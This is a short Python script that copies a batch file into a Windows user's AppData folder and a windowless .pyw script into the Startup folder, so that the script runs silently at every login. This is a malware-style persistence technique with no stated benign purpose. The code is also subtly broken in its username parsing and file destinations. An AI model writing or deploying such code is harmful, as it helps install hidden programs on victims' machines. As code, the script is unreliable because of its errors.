import os
user = os.popen("whoami").read()
user = user.partition("/")[2]
os.replace("D://sys.bat", f"C://Users//{user}//AppData//Roaming")
os.replace("D://main.pyw", f"C://Users//{user}//AppData//Roaming//Microsoft//Windows//Start Menu//Programs//Startup")